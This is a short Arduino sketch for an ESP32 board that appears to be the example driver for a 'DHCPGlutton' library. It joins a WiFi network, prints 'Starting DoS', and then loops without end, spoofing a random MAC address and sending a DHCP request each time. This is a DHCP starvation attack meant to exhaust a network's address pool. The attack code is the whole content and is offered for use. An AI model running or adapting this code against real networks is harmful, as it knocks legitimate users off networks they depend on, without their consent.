#include <Arduino.h>
#include "DHCPGlutton.hpp"

#define SERIAL_DEVICE Serial0   // ESP32-S3 use this
void setup()
{
    WiFi.mode(WIFI_STA);
    WiFi.begin("SSID", "PASSWORD");
    SERIAL_DEVICE.println("Connecting to WiFi network");
    while (WiFi.status() != WL_CONNECTED);
    SERIAL_DEVICE.println("Connected! Starting DoS");
}

DHCPGlutton dhcpGlutton = DHCPGlutton();

void loop() {
    SERIAL_DEVICE.println(WiFi.isConnected());
    SERIAL_DEVICE.println(WiFi.macAddress());
    SERIAL_DEVICE.println(WiFi.localIP().toString());
    SERIAL_DEVICE.println("Randomazing MAC");

    dhcpGlutton.random_mac_address_spoof();
    dhcpGlutton.send_dhcp_request();
}